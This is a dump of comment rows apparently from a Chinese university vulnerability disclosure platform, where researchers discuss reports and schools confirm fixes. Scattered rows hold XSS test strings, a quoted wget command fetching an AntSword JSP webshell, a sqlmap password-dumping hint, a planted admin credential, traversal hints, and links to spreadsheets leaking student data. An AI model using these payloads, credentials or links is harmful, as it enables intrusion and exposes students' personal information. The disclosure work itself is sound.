39450,6677,牛逼
39450,6701,大佬前端打后端喽
39457,6696,老哥人呢？为何不审核我的漏洞
39457,6696,翻看整个9月的上海交通大学的漏洞记录，没有一个暴破漏洞，给1分是不是太让人寒心了？此漏洞危害显而易见，审核了好多天最后只给一分是不是很不好？
39457,6696,说错了，外国语大学
39494,474,感谢提醒。
39569,6098,网络卡了一下，提交了两遍
39612,527,已删除。
39629,6677,这个标题太秀了
39634,94,招聘教师信息
39638,1297,经研究，拟采取以下 2 条措施，以提高教务管理系统的安全性。<br />  1. 弱密码强制修改（已经升级完善）；<br />  2. 完善“修改密码的认证”功能，近期将开发“手机验证+邮件（或统一身份认证）”验证的功能。<br /><br />感谢通报！
39677,555,已经删除
39706,2523,删除了
39733,1297,已更新shiro至漏洞修复后版本，漏洞已修复，感谢通报！
39743,314,已删除
39753,6701,倒霉啊
39757,5876,数据已删除，未保存至本地
39758,5984,嘿嘿嘿 明明没错好嘛
39759,5984,我去 图片上不去
39759,6701,哈哈
39762,6369,刷完最后这个就去搞点高级的漏洞去了
39766,6701,sql注入统统都是中危吗,心烦
39862,3555,已经删除该文档，非常感谢及时提醒我校。
39873,4194,这个IP不是清华大学的，应该是教育网的IP。请通知教育网整改。
39881,6701,7rank,感谢,,
39894,6701,审核大大给个面子
39932,28,这是个人特意公开的信息，不应判断为泄露
39934,6677,牛逼，智哥
39938,6430,非常不容易
39938,6609,太强了
39938,6609,带带弟弟
39938,6430,不，我是弟弟
39938,6430,不，我是弟弟
39943,6665,问题不大啊
39943,6609,这都可以通过？
39943,6609,我觉得这个漏洞价值0rank
39943,6641,问题不大，贵校可以忽略此风险。
39943,6609,&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;
39943,6609,+1
39943,6701,这1rank都算高了
39943,6701,测试xss草,,草死,,,
39943,6609,&quot;&gt;&lt;p href=&quot;javascript:alert(“我觉得应该忽略这个漏洞”)&quot;&gt;link&lt;/p&gt;
39943,6683,都没有什么价值，希望贵学校忽略
39943,6641,既然把xls发到网站了，我相信贵校是做好了被下载的准备，所以可以忽略
39943,6665,+1
39943,6702,哎 你们就欺负我吧，我委屈
39943,6573,趁现在先申请证书再说呀，哈哈~
39943,6728,既然把xls发到网站了，我相信贵校是做好了被下载的准备，所以可以忽略
39943,6702,怎么就没风险了？要是被贷款类不法分子拿到，是很危险的
39971,6139,直接--passwords 可以查到数据库管理员密码！哈希值去somd5.com就可以解密出来
39974,4194,该域名和IP都不是清华大学的。
39974,6172,抱歉，我看顶域定向到清华才提交的
39999,6609,不要写信息泄露啊
40016,6572,这都重复了，我太难了
40044,474,感谢报告
40047,3828,已删除
40069,6677,牛逼
40073,6430,tql
40073,6563,牛逼
40075,6103,尝试使用admin(普通管理员)添加system/0ne123456(超级管理员)。账号记得删除
40139,484,已经交相关单位处理，谢谢
40140,2196,这个早已处理过了
40144,6327,我c。小弟来看看
40145,5876,https://www.xjjtxy.cn/lyuapServer/login?service=https%3A%2F%2Fwww.xjjtxy.cn%2Fsafe%2Fjsp%2Flogin.jsp         是这个
40166,5904,我太难了
40166,5904,不过还是感谢老师 给获取证书的机会 谢谢老师
40181,5714,修改弱口令，更新系统版本
40188,6609,老弟，还刷啊
40249,6417,中危可以吗
40259,484,收到，谢谢，已经转相关单位处置
40305,5984,国庆前有的，，，有个站点管理平台，，，，
40316,5984,哦豁 改成中危，，，，，，，，
40317,5984,修改可导致站点瘫痪。。
40319,5984,哦豁，，，中危以上吧，，，又忘记修改，，
40322,5984,哦豁 又忘了，，，改中危
40325,6417,申请成为中危
40333,6492,王老师 tql
40333,5897,王老师又开始啦
40379,5876,我去，忘记上传图了。。
40382,6790,声明一下，我不是该校学生，我也不是大佬，我只是帮别人（我朋友）测试的。
40442,5904,我觉得你很强
40442,6563,哈哈哈，等我真正变强的时候就收了这句话
40465,6696,别告诉我又重复了
40467,1297,已限制访问，要求责任单位整改。感谢通报！
40467,1297,归属责任单位反馈该功能实际运行中没有使用到，已关闭。
40470,6151,应该是未授权访问小姐姐照片
40470,6103,想康康
40470,6701,给弟弟们留点汤吧
40470,6563,想康康
40486,6372,选错了，不是低危。。。。。
40486,6372,选错了，不是低危。。。。。
40486,6677,哈哈哈哈，智哥,没事的,审核老师是好人,已经帮你选中危了
40486,6444,哈哈哈
40503,6139,图片传不上去。。传了半天没反应
40506,6807,血魂大佬太强了
40510,6677,不容易啊同学。。
40510,6731,之前那些交的时候没仔细看，简单描述写了过程都没给过。。
40517,1297,网站校内归属存在争议，已断网处理。感谢通报！
40518,3870,已经停用该迎新报到系统，计划采购或开发新的迎新报到系统。
40527,6151,麻烦审核老师改成 【上海建桥学院】，辛苦啦
40533,4845,收到，感谢白帽子。已修复。
40538,6151,啊，昨天太晚最后那个链接挂错了，麻烦老参考前面的修改下
40546,6608,这个系统，里面的数据有很久之前的了
40549,1979,第二个问题没有重现
40588,6444,等级帮忙改下
40590,455,泄露学生信息已经删除，就业系统使用身份证号后六位作为初始密码也是较常见情况，后续会安排就业系统进行强制修改初始密码的操作。您手上的名单麻烦删除吧，感谢。
40590,6151,谢谢老师，？？？但是我手里没存留名单啊，截图都是从先前的报告里引用的
40606,6414,王老师是日到核心系统了吗
40622,6742,oooooooooooooo
40626,6103,这个ip 有多个站
40626,6103,history 有这条记录 wget https://raw.githubusercontent.com/AntSwordProject/antSword/master/shells/jsp_custom_script_for_mysql.jsp -o shell.jsp<br />也不知道是不是站被拿过了 建议webshell查杀下
40627,6689,输入 info 查看信息 ，关于网上有很多这个命令
40634,5984,又上不了两个图emmmmmm
40672,1297,已修复，感谢通报！
40717,6563,十分欸
40717,6216,强啊
40717,6561,这是人干的事吗
40717,5904,Adrian表哥tql
40717,6430,tql
40717,6372,如果我有adrian巨佬百分之10的技术我还混成这吊样
40717,6701,球球你别挖了，给弟弟们留一点吧
40738,6563,手机号忘记打码了……
40742,6558,如果我有楚轩巨佬百分之10的技术我还混成这吊样
40742,6103,如果我有楚轩巨佬百分之10的技术我还混成这吊样
40742,6625,如果我有楚轩巨佬百分之10的技术我还混成这吊样
40743,6444,牛皮
40768,6524,重复也有1rank？
40781,3994,谢谢兄弟！正在处理！
40803,5574,哈哈哈哈哈 确实啥也没有交着玩
40806,6661,好吧，编辑器bug貌似修了
40807,6796,麻烦快点审核哦
40823,6641,你也是温州的吗？
40823,6327,我也是温州的啊
40826,1297,该弱口令账户已修复，同时对系统中存在弱口令的账户通知修改密码，并提高密码设置的复杂度。其他防爆破策略正在整改中，感谢通报！
40829,6327,小弟前来看戏，顺便扣个666
40829,6625,小弟前来看戏，顺便扣个666
40829,6414,6666
40839,455,经确认看到的菜单都无法进入，都会跳转到认证页面。实际上无法绕过登陆，看到的界面只是top栏目，不能做任何实际操作。
40839,455,请教一下，若这个漏洞不修复会有什么后果呢？
40947,3154,谢谢，已经处理
40971,5868,http://******************/ec<br />也存在这些问题 ,把sc改为ec就行
40971,5868,还有ti 也有
40975,6661,tql
40976,5868,正常而言他会拦截的提交的XSS语句，我经过精心构建才绕过~
40994,6641,你现在到底咋回事？
41019,6151,太难了，还是谢谢审核老师
41038,6661,tql
41052,1297,已删除，感谢通报！
41053,6573,忘了截图文章编辑器添加和删除功能。。。
41091,6840,目前已经联系管理人员，该漏洞已经修复。
41095,5868,好的，谢谢
41103,6662,真滴强！
41103,6327,真的强
41119,6722,危害等级选错了..麻烦审核看着改一下，谢谢了不好意思..
41134,1297,已删除，感谢通报！
41154,6815,是重置的时候访问出错吗
41154,6815,是重置的时候访问出错吗
41198,1297,已删除，感谢通报！
41205,1297,已删除，感谢通报！
41212,1297,已删除，感谢通报！
41213,1297,已删除，感谢通报！
41215,1297,已删除。感谢通报！
41231,1297,已删除，感谢通报！
41232,1297,已删除，感谢通报！
41247,1172,2333还是手慢了一部啊，采购系统都是一套啊
41278,1297,表单提交增加xss过滤，xss脚本提交提示非法字符串，无法提交。感谢通报！
41281,1297,邮箱限制一个账号一天只能发送四封邮件。感谢通报！
41282,6641,tql
41287,6661,tql
41287,6444,牛皮
41287,6662,牛逼
41287,6103,牛掰
41287,6563,牛啊
41287,6625,500大洋，到手了。
41287,6786,500大洋，到手了。
41287,6838,牛逼
41287,6739,666五百块到手
41305,5876,可以更深一步利用。
41313,1297,已限制访问，感谢通报！
41314,1297,已限制访问，感谢通报！
41315,1297,已删除，感谢通报！
41316,1297,已限制访问，感谢通报！
41317,1297,已限制访问，感谢通报！
41318,1297,已限制访问，感谢通报！
41319,1297,已限制访问，感谢通报！
41320,1297,已删除，感谢通报！
41321,1297,已删除，感谢通报！
41322,1297,已删除，感谢通报！
41323,1297,已删除，感谢通报！
41324,1297,已删除，感谢通报！
41325,1297,已删除，感谢通报！
41326,1297,已删除，感谢通报！
41376,6794,这个本身就允许更改。
41376,6580,那就是说没证书咯？
41386,6661,8分的弱口令，我枯了，tql
41397,6098,漏洞报告内有文字说明，有漏洞URL，有复现的账号密码，有详细的复现步骤和证明截图，工具只用了burpsuite，你别告诉我没有。你这个评价呵呵呵
41400,5714,这种情况能绕过的多，执行的少，是个讲课的好案例。
41400,5897,这种情况能绕过的多，执行的少，是个讲课的好案例。 建议讲讲！
41400,6652,跪求大佬出文章
41420,1078,没明白漏洞在哪？
41459,88,已经修改，请帮忙再检测一下！
41459,6172,已检测，上述漏洞已修复
41484,2266,已经清除，谢谢！
41506,4152,已经修复漏洞
41517,6689,请按照上面步骤一步一步操作
41517,6689,是的哇
41542,6567,这个漏洞描述有点问题应该是任意用户登录
41544,5868,什么信息泄露能给中危
41559,6838,强啊
41577,1172,给个中危就这么难的么？？？
41580,6641,加油撒
41580,6641,I C Q
41584,6641,加油撒
41585,1297,已删除，感谢通报！
41614,2196,这是开发公司测试的系统，在阿里云上，不在校园网络了，我们通知他们
41615,313,不是交大的系统。
41654,1297,经核查，该网站归属非浙大。通过icp备案号可以查到网站主办单位名称为杭州浙大同力后勤集团有限公司，为企业独立备案网站。
41667,5714,牛
41667,6666,666
41748,1297,已修复，感谢通报！
41749,1297,已修复，感谢通报！
41767,489,相关站点部门回复说认为是可公开数据，非敏感信息。
41769,2123,已修复。
41780,1297,已限校内，要求责任单位整改，感谢通报！
41781,1297,已限校内，要求责任单位整改，感谢通报！
41810,1297,已限校内，要求责任单位整改，感谢通报！
41835,1297,已删除，感谢通报！
41856,6661,我太难了，都没人评论o(╥﹏╥)o
41856,6209,强得很
41858,1172,？？？老哥你漏洞说明写错地方了吧
41862,6661,tql,MG(ಥ_ಥ)
41894,6661,我太难了，都没人评论o(╥﹏╥)o
41894,7367,有人来评论了鸭!(͔▪̆ω▪̆)͕
41911,1297,已限校内，要求责任单位整改，感谢通报！
41930,6020,hhtql
41944,6661,你也来辣
41944,1080,开始处理，谢谢大侠！
41944,6918,来了
42031,6103,用户管理查询那几个接口应该都有这问题
42054,2652,山东省临沂卫生学校
42059,6567,用户密码重置
42065,5876,不对，我说错了，不是0-9，是0-3，我刚才记错了排序
42073,6580,可以全部修改。。。只要去跑就行了
42073,6962,也许这就是梦梦吧
42079,1297,已限制访问，感谢通报！
42087,1297,经检查，为友情链接的网站业务发生变更导致，已作删除处理。感谢通报！
42105,6843,辛苦了
42149,6816,大佬牛逼
42154,6661,我太难了，都没人评论o(╥﹏╥)o
42154,6683,大佬带带
42155,6572,亲爱滴审核大大，可以给个机会换证书咩
42209,5714,忘记放url了。。审核辛苦下输入一下。。
42212,4085,这个漏洞确实很重要，请问列表中就是存在123456弱口令的全部账号吗？
42212,5714,不是的，我在贵校随便找的名单，应该还有其他教师存在弱口令
42223,6580,激活的地方也有。
42223,4085,这是学校用的知网的平台，漏洞属于知网的，可以让学报的工作人员跟知网反应一下。
42223,6580,哈哈，那这个没证书咯？
42234,5876,下方有举办单位列表，以此判断归属为西交大
42265,1080,非常感谢，马上修复！
42267,6151,忘记附其他例子了，最好去站点目录下看看，应该有很多
42316,6172,具体归属可查看首页图片和所有区域，使用对象为学校
42316,3938,十分感谢你的关注！根据该设备的管理员要求，我单位的网络科技术人员已对该设备做了外网屏蔽处理。再次感谢你的工作。
42322,6661,TQL,DDWHM
42322,6641,TQL,DDWHM
42329,6580,ddhm
42329,1809,感谢支持，已关停网站。
42371,6580,0.0
42392,1146,彩蛋
42392,6924,大哥，您太强了
42396,6677,你知道我的梦，知道我的痛。
42402,6641,强啊
42404,6677,强
42404,6580,tql
42404,6661,ddddhm,XD
42404,6641,icq tqlhhhh
42405,6661,ddwhm
42405,6641,强啊
42405,6641,强啊
42405,6580,ddwhm
42405,6155,dgddwhm
42405,2211,这不是哈尔滨医科大学的网站，本校没有103开头的IP.
42409,6838,硬编码
42412,6103,师傅快审核不然密码又被改回来了😁
42412,3990,已经处理了
42414,7163,师傅也太强了吧 全getshell
42433,6162,尴尬，这种情况满足换证书的条件吗？
42433,6661,不满足
42438,6580,还可以下载。。。
42438,6580,三万多泄露。
42460,3994,已经处理！谢谢了！
42464,6580,tql
42464,6677,tql
42464,6661,tql8
42464,6641,tql8
42464,6701,tql
42464,6731,tql
42464,6850,tql
42464,6838,tql
42466,6641,NB
42466,6661,tql
42466,6580,tql
42466,6941,tql
42466,6705,这标题就牛逼啊
42466,6165,tql
42474,6580,tql
42474,6701,tql
42507,5641,10月28的也重复了？
42582,3465,已删除该页面！
42625,336,如果随意输入验证码，最后一步重置密码时会提示验证码错误。重置密码失败。
42629,6661,太难了
42629,6838,太难了
42643,6838,开门红
42643,6822,感谢大佬们捧场
42643,6661,tql
42653,6174,有证书吗
42659,6661,权限是system，忘了截图了QAQ
42659,6661,而且还是站群。。。
42659,6661,才3分，我太难了
42659,6806,兄弟，可以做个回头客，
42660,6580,太难了吧，才2rank
42661,6580,tql
42661,5897,tql
42661,6782,tql
42661,489,然而和华南师范大学没有任何关系，IP不属于华南师范大学，目标站点没有任何字样和华师有关联。
42661,6103,hhh 楼上评论亮了
42661,6936,111111111
42661,489,下次我也到阿里上建个服务器，搭个弱密码系统，标题写xx大学
42674,6701,tql
42674,6677,tql
42674,6806,tql
42747,1297,未按要求修复，已限制对外服务。
42751,6172,由衷的感谢上海体育学院
42772,6609,1
42772,6609,1
42835,6430,用ie浏览器
42923,5714,tql
42925,6661,tql
42926,6657,审核老师能不能给3个金币差3个金币换证书了
42927,4475,该ip地址非学院所有，该网站可能是学生毕业设计作品。
42965,6580,在问答那里有管理员账号，可以重置管理员密码。
42966,314,已联系厂商处理
42986,6580,验证码处也得修改一下，防止爆破
42989,5714,修补弱口令 ， 验证码后台验证时刻刷新
42989,6661,tql
43014,6924,好的
43021,4194,清华大学已对SPF做了设置，应该不是清华大学的问题
43022,583,感谢。
43025,2688,旧网站，迁移完数据没有关停，现已关停
43030,6973,&lt;/233&quot;&gt;
43064,1297,已修复，感谢通报！
43086,6913,不好意思，这个链接http://law.bit.edu.cn/docs/2019-09/20190920012136388693.xlsx
43090,6677,哈哈哈哈哈哈哈哈哈，今天审核老师很调皮
43090,7146,师傅你太皮了 能不能对我好一点
43092,6677,哈哈哈哈哈哈哈哈哈哈哈哈哈，审核老师的要求2好调皮<br />不符合年轻人追求新潮的性格
43092,6915,我的锅我的锅
43092,7046,哈哈哈，韦老师幽默风趣。
43094,6822,get狂魔，出现了！！！
43096,5714,所有测试shell均在某Files下 删除即可
43096,6661,tql
43127,6580,都太难了
43130,6572,一直昨天没空哇，今天想复现的，没想到这么快关站了，第一次见这么快的
43139,5714,同8080端口存在同样问题
43141,6677,还有这种学院？？？？
43143,6962,经过验证发现可以使用弱口令登入山东理工大学网上服务大厅
43168,6580,密码都是身份证后六位
43169,6103,营业执照 处
43169,6580,ddwhm
43192,6946,全校信息只值3分吗😂 <br />打扰了...
43274,6786,500大洋到手
43285,6661,ddddhm
43285,6580,ddhm
43318,6915,对了，这个返回包包含了应该是全校学生的信息，这不来个高危
43322,6661,tql
43322,6402,tql
43322,6580,tql
43322,6946,tql
43322,6677,tql
43322,6731,tql
43327,6661,ddddhm
43327,6701,tql
43327,5895,tql
43331,7019,才 rank3  早知道 跑出完整的数据库名了。。
43331,6414,666
43331,6946,...我提交的sql <br />数据跑了100条……<br />也是3分 打扰了😂
43365,6912,不好意思，忘记选择漏洞单位了，是否能够帮忙修改漏洞单位的
43382,6580,没看，忘记了，不知道修改的地方有没有
43388,6402,tql
43396,6962,tql
43396,6978,表哥，带我
43396,6677,tql
43396,6580,ddddhm
43396,6992,ddddhm
43396,6701,ddddhm
43398,6151,图片链接的是服务器上的原图
43409,6580,其他地方应该也是一样的，只不过账号没审核过而已
43416,5714,tql
43416,6661,ddddhm,wofole
43416,6572,xmsl
43416,6103,牛
43416,7223,强
43416,6687,tql
43444,6661,0day,tql
43447,6580,ddddhm
43447,6677,大佬的通用支付漏洞
43447,6414,后台越权查看订单？
43456,6962,tql
43456,6677,tgl
43474,542,已收到，感谢关注我们江汉大学，江汉大学将立即整改，江汉大学已与软件系统开发商南京汇文联系处理，江汉大学再次感谢关心！
43474,542,江汉大学，江汉大学，江汉大学，谢谢！
43483,6580,忘记填单位了，审核老师帮忙填一下。
43483,6580,重置密码的分都这么少了吗？
43504,6479,hello，但是我做到这一步也无法证明密码是否能成功修改，我以后提交的时候应该做证明表示他存在？
43521,6580,tql，ddhm
43554,6962,ddddhm
43554,6978,表哥，求带
43557,6655,感谢指点。<br />此外，这是山大附中的网站，不是山东大学的。
43565,6414,我也被影响了  怕！！！！
43580,6689,意思就是 随便你输入什么都可以！
43591,1297,已修复，感谢通报！
43597,7163,get师傅
43602,6580,我发癫了，又忘记填单位了。麻烦审核老师填一下。。。
43630,6677,tql
43630,6701,tql
43630,6661,wofole
43630,6735,tql
43630,6402,tql
43653,6103,ddw
43653,6978,大佬能不能带我挖洞
43653,6786,500大洋到手
43663,6913,很抱歉，图贴错了，点顺手了TvT
43664,6913,很抱歉，图贴错了，点顺手了TvT
43665,6913,很抱歉，有张图贴错了，点顺手了TvT
43667,6913,很抱歉，图贴错了，点顺手了TvT
43668,6913,很抱歉，图贴错了，点顺手了TvT
43691,6055,大佬牛逼
43693,5117,已经下线做整改
43695,6981,里面数据库涉及到敏感信息，为什么不是高危？
43701,315,系统并非北京理工大学所属。
43704,6414,多余的图片忽略，提错了
43707,6580,ddddhm
43707,6402,tql
43707,6661,我 佛 了，tql
43707,6444,注入牛
43736,6962,可以进入门户中心，可以进入vpn
43739,6924,大佬哈哈哈
43740,6822,oooo明白了，考虑不周到了
43766,2137,已经处理。
43775,484,收到，谢谢，已经转相关责任单位处置！
43776,6946,.....尊姓大名
43787,6430,陌少哥哥
43787,7039,太强了
43787,7039,强的一批啊。。。提交这么多 带带
43804,4845,上次管理员从页面上删除后，忘了从服务器目录上删除源文件导致。现已彻底清除。谢谢
43844,6430,在不在
43857,5876,我发现这个站的大部分目录都会跳转到这个bc站上去。
43867,6151,忘记放链接了，辛苦老师手打下
43895,2431,提交重新了，拒绝通过就行
43905,4085,请问您是用哪个IP地址访问的，这个网站我在防火墙对访问的IP地址做了限制，正常应该是山东泰安本地能访问。
43909,1702,已处理
43925,6414,666
43925,6936,6666
43925,6701,tql
43939,6414,有些图片上传错了，忽略！
43943,6739,登录地址给错了，应该是这个http://sdskills.sdei.edu.cn/UserLogin.aspx
43981,489,感谢提交，已处理。
43984,6924,tql大佬
44005,6962,666
44005,6946,666
44005,6755,666
44005,7086,666
44005,7066,666
44005,6742,666
44043,7146,大佬怎么联系 一起挖洞呀 带带弟弟 哈哈
44045,1297,已删除，感谢通报！
44065,4386,感谢您的反馈
44068,177,http://wx.fzu.edu.cn/userfiles/6/files/cms/article/2019/09/%E9%99%84%E4%BB%B62%EF%BC%9A%E6%8A%A5%E5%90%8D%E8%A1%A8.xls​，链接与截图对不上
44068,6755,不好意思刚看到地址是http://jwch.dlou.edu.cn/_upload/article/files/09/18/b5df83d74665ac4bea393593970c/fb94175e-ac5f-41bb-9e73-2141299bcb6a.xls<br />另外刚刚又发现贵校另外一个http://youth.fzu.edu.cn/attach/download/2016/08/29/231014.xls
44068,6755,再次不好意思，上面一个回复第一个连接把别人的放上去了。改份连接http://jgxy.fzu.edu.cn/attach/download/2019/06/20/350198.xls
44068,6755,刚刚看到您消息时候，着急了一下。缓过神儿来我发现。您在回复里的连接与我的不符呀(๑• . •๑)
44068,6755,可以的话删一下我那个链接，其他学校的还在审核
44072,6755,搞错了，这是华南农业
44072,6755,麻烦修正一下
44097,2359,谢谢，我们马上处理！
44104,6755,Trojan/HTML.Redirector.c
44132,7146,这个没有被提交过吧，我看文经学院的首页了，审核小哥哥小姐姐能否仔细看下呢，谢谢您
44141,1080,感谢作者，我们立即责成其改正。
44145,7146,中危或者低危，审核小哥哥小姐姐辛苦了
44152,7146,http://dgpt.zlgc.chaoxing.com/login
44184,6962,sheel1内
44288,7046,并且没有限制获取数量，上面打错了。
44294,6822,太强了
44294,6838,没说的  牛逼
44294,6103,lcrce?
44317,6838,牛逼
44341,484,收到，已经转相关责任单位处置
44354,6172,可目录穿越 ../   验证根目录/1.txt
44359,3408,多谢，已收到，已经联系开发公司修复漏洞
44426,7223,强，大佬带我
44432,1297,网站即将改版，目前该网站已经下线，感谢通报！
44456,6676,修复建议：<br />禁言，删除或限制不必要接口，对正在使用的接口进行认证时应与身份绑定，而不是只验证是否登录。在寻找第三方时也应该检测其是否符合安全要求，而不是一味的扔给第三方，在等保2.0中也有对外包软件的要求，甲方，也包括高校，更应该注重这一点。
44461,1080,非常感谢给我们发现问题，已经在处理，今天完成
44470,489,两个身份证号码都检查过，不存在该身份证号码。
44502,7167,点错等级危害了！！！！！
44513,1080,感谢，马上就处理
44550,6572,外水千山总是情，给个中危行不行
44576,1297,已关闭相关模块。感谢通报！
44630,7184,这个xss可以对网站进行xss破坏 和打到cookie 还可以配合flash下载控制电脑等危害
44631,7184,教师账号密码也是账号 一样可以登录
44631,7184,这个本来跟那个xss一起提交的结果一下搞忘了
44661,1297,已修复，感谢通报！
44728,2440,该学校第二次发现同类问题，建议该校全面排查
44731,6661,🙈🙈🙈
44735,7178,用Burp都是可以访问的
44922,5876,给个十分吧大佬，猜规则不容易啊
44953,2270,已处置
44971,6567,攀枝花市经贸旅游学校标题写差了
44983,1297,已删除，感谢通报！
45005,1297,已关闭相关模块。感谢通报！
45014,7146,审核宝贝给个10分呗，嘻嘻
45020,1297,已删除，感谢通报！
45034,1297,已修复，感谢通报！
45049,6642,嗯嗯 好的下次注意  ^_^师傅能不能顺利帮忙把其他几个审核也批了么
45141,6151,心疼王老师
45141,5904,太难了
45147,5714,加强文件校验，ip段外系统可不需要公布在官网。
45153,1080,好的，正在处理，感谢！
45154,479,非常感谢，我们已第一时间联系网站管理单位已处理问题，谢谢！
45154,479,学院财务部门网站管理员已暂时关停网站，并对网站账号进行了安全检查加固设置复杂密码。再次感谢白帽子的辛勤工作和及时提醒！
45167,6642,真的尴尬，其实开始正常，我调用了一次system函数就直接挂了
45251,3240,已将泄漏信息页面删除
45304,7229,123
45336,484,谢谢，相关单位已经删除
45341,484,谢谢，相关单位已经删除
45356,474,漏洞确实存在，已做升级修复。
45479,6572,路径那写错了哈，以真实截图为准
45503,2533,已删除敏感信息！
45519,4872,您好，经查，此链接是一个2015年的文件，里面有学生身份证号码，已经联系院系进行了删除，并告知院系管理员今后不能在上传文件中保护完整身份证号码。现整改完成，谢谢！
45519,4872,您好，经查，此链接是一个2015年的文件，里面有学生身份证号码，已经联系院系进行了删除，并告知各院系管理员今后不能在上传文件中保护完整身份证号码。<br />现整改完成，谢谢！
45520,1080,谢谢，马上就处理，感谢！
45547,7235,确实不访问VPN也可以，这里只是给出我发现的途径嘛
45561,484,谢谢，弱口令已经修改。已经转相关单位处理。
45563,6474,这是我校的一个测试网站，其中的用户信息都是自动生成的，采用统一身份认证，登录密码在登录时并不使用。
45601,1297,已删除，感谢通报！
45611,2345,已将敏感信息删除
45614,1297,已删除，感谢通报！
45646,7193,sql 注入两分????
45664,5876,补充下，账号/密码   请按这个看，我刚才忘了写进去啦
45677,7223,强
45694,6962,tql
45694,5904,运气 哈哈
45694,6506,Orz
45694,6200,我想起来我的账号和密码了QAQ，话说你这两周怎么不提交漏洞了QAQ。
45694,5904,来了老弟
45715,542,已收到，我们尽快处理。谢谢
45749,2266,信息已经处理，并对照问题，进行自查！
45766,1297,已删除，感谢通报！
45780,7188,图片上传错了，审核的小哥不用看这个图
45789,483,您好，该网站为云采通运维的信息系统，与合肥工业大学没有任何关系，我校直属单位无“双非”网站。请审核！
45797,1297,已修复，感谢通报！
45808,1297,已关闭存在问题的服务应用，感谢通报！
45812,1297,已修复，感谢通报！
45818,7249,我写出来了的。。
45908,608,文件未找到，已删除
45930,5904,666，还有女神邓紫棋
45930,6172,给老师丢脸了。一个只会挖弱口令的学生
45932,7068,多给点分吧，毕竟有多个漏洞呀。
45938,6580,太强了
45940,484,谢谢。已经转校团委，请校团委转相关社区确认，处置。
45950,6977,谢谢
45953,6580,可能改的时候点不了，刷新或者重试。
45958,5876,还有优秀毕业生。。。
45968,4845,收到！非常感谢。已经关闭此网站外网访问，内部整改中。过了等保测评以后再开放
45969,2662,谢谢正在处理。
45969,2662,已处置
45984,7249,这个网络问题提交重复了，请在后台删除下
46000,6196,网站和ip都非本单位，经过核实网站属于下属单位网站，已经告知负责人，采取先断网后处理了。谢谢🙏
46006,5765,该系统开发与维护均不属于吉林大学，是某为吉林大学提供服务的书店使用的。已通知该书店对系统进行整改。
46013,555,漏洞已经修复，数据都是模拟数据，非真实数据
46037,1297,已修复，感谢通报！
46039,5876,来个十分吧，挖洞艰难啊大佬
46046,6572,第1步的URL写错了，以截图为准
46057,6572,现在的洞这么廉价吗，写报告写个半死唉
46063,6572,该系统还存在些许问题，请学校老师尽快与我取得联系，联系方式：246392406
46066,499,该系统非重庆大学资产，所留邮箱经核实并不存在。
46090,4475,已修复
46098,6641,tql，拿burp挖信息泄露哈哈哈哈哈哈哈哈哈哈哈，汝为何如此优秀
46098,6683,大佬大佬，这就是低位变高危嘛
46098,6055,高危呐?
46098,7190,大佬nb，信息泄露变高危
46098,6372,斗宗强者恐怖如斯，这就是强者的世界吗？
46098,6962,这就是大佬吗，快给我看看怎么变高危
46098,5714,签名好评，但用网安的热度去争钱确实会被吐槽
46098,7185,大佬带我低危变高危
46098,6563,所以他是谁？？-，-
46098,5904,评论区有些热闹
46098,6755,大佬，这就是你说的组合拳嘛(๑• . •๑)
46098,6327,这就是大佬的组合拳低危变高危嘛？
46098,5889,楼上的你们好啊
46100,7146,审核你好，这个Payload，在提交完成后，乘号（*），会自动被注释掉，谢谢两个payload，3乘2乘1=6和3乘2乘0=6
46111,6755,nb
46111,2377,太厉害啦👍
46111,7246,tql
46123,1080,已经收到，谢谢！
46125,1080,感谢，马上就处理！
46215,4872,您好！您提及的弱口令系统已经去除了，请核实，多谢！<br />若有问题，请随时联系：19801307683，再次感谢！<br />2019-12-27
46255,6580,默认密码一样的，一大批账号
46259,6962,登录退出来重新登就可以进去
46279,484,谢谢，相关单位已经处置
46290,1297,已修复，感谢通报！
46329,7045,发布.zip是备份文件
46359,7201,大量账户可以登录本科教学工作业绩点申报与统计系统,其他系统没有测试,猜测不少系统可以登录。
46384,6414,可员师傅带带弟弟
46440,7100,OK
46475,484,谢谢，相关单位已经处置
46716,5876,我的意思是想说它影响较多导师，不是单指这一个。
46716,2267,相关通知已经撤销，但是https://tutors.eol.cn/admin/manager/login并不是我校域名，后续我们尽量尝试联系下这个网站的管理，看看能不能做出密码复杂度方面的更改
46720,6641,PS: 这IP里还有200多个华东师范的资产域名,是不是意味着数据库里。。。。。
46723,7287,这个是通过了吗，还是要重新提交
46775,484,谢谢，已经反馈相关单位处置
46795,1080,谢谢，收到，及时处理。
46795,1080,和之前通报重复，已经处理过了。
